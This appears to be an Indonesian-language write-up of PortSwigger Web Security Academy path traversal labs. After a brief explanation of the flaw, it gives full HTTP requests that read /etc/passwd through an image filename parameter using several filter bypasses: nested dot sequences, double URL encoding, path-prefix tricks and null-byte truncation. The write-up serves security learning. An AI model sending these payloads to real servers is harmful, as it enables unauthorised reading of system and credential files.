
## Apa itu penjelajahan jalur?

Penjelajahan jalur juga dikenal sebagai penjelajahan direktori. Kerentanan ini memungkinkan penyerang membaca file sembarangan di server yang menjalankan aplikasi. Ini mungkin termasuk:

- Kode dan data aplikasi.
- Kredensial untuk sistem back-end.
- File sistem operasi sensitif.

Dalam beberapa kasus, penyerang mungkin dapat menulis ke file sembarang di server, memungkinkan mereka mengubah data atau perilaku aplikasi, dan pada akhirnya mengambil kendali penuh atas server.


**Solve lab 1:**

- saya menggunakan tool automation punya saya


**Solve lab 2:**

```json
GET /image?filename=/etc/passwd HTTP/2
Host: 0a6900f403201ac18005999f0036002a.web-security-academy.net
Cookie: session=NwbRdFGi0Og4SrFoDv9RsdK7mIIDrjma
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: close
```

**Solve lab 3:**

```json
GET /image?filename=....//....//....//....//etc/passwd HTTP/2
Host: 0aec00e70358ade280139e0300a70068.web-security-academy.net
Cookie: session=nITEmfarmC1HDI44BOjop1TtczQKKjcJ
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Priority: u=0, i
Te: trailers
Connection: close
```

**Solve lab 4:**

```json
GET /image?filename=..%252f..%252f..%252fetc%252fpasswd HTTP/2
Host: 0a2e002404dbf1eb83b0b54700650006.web-security-academy.net
Cookie: session=ufozwZhqEuiLSzLRdIvTT5GI6qi7PeVB
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a2e002404dbf1eb83b0b54700650006.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

**Solve lab 5:**

```json
GET /image?filename=/var/www/images/../../../etc/passwd HTTP/2
Host: 0acd00380383ecd084b53b39001600c5.web-security-academy.net
Cookie: session=bMZat53I0DWwL3pzcSHuY8idTQdOQ2rx
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: close
```


**Solve lab 6:**

```json
GET /image?filename=../../../etc/passwd%00.png HTTP/2
Host: 0abb006503b8bdcd802ed572005f00ff.web-security-academy.net
Cookie: session=piNKJKgHzni3BJDwSlMYhoZNxrIZvMRB
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0abb006503b8bdcd802ed572005f00ff.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: close
```

